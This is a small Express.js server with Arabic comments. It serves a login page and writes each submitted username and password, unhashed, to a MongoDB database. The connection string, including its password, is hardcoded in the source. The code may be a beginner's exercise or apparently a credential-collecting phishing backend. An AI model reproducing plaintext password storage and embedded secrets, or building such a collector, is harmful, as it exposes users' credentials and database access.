const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const app = express();

app.use(express.urlencoded({ extended: true }));

// رابط الاتصال بقاعدة البيانات مكتمل وجاهز
const mongoURI = 'mongodb+srv://mohamedelshaal50_db_user:mohamed123@cluster0.heat622.mongodb.net/?retryWrites=true&w=majority';
mongoose.connect(mongoURI)
    .then(() => console.log('تم الاتصال بقاعدة البيانات بنجاح!'))
    .catch(err => console.log('خطأ في الاتصال:', err));

// تحديد شكل البيانات التي ستخزن في قاعدة البيانات
const userSchema = new mongoose.Schema({
    username: String,
    password: String,
    date: { type: Date, default: Date.now }
});
const UserData = mongoose.model('UserData', userSchema);

// عرض صفحة التسجيل
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال واستلام البيانات وحفظها في قاعدة البيانات السحابية
app.post('/login', async (req, res) => {
    try {
        const newEntry = new UserData({
            username: req.body.username,
            password: req.body.password
        });
        await newEntry.save();
        console.log('تم حفظ البيانات بنجاح في قاعدة البيانات:', req.body.username);
        res.send('<h1>تم التسجيل بنجاح</h1>');
    } catch (err) {
        console.error(err);
        res.status(500).send('حدث خطأ أثناء الحفظ');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`السيرفر شغال على البورت ${PORT}`);
});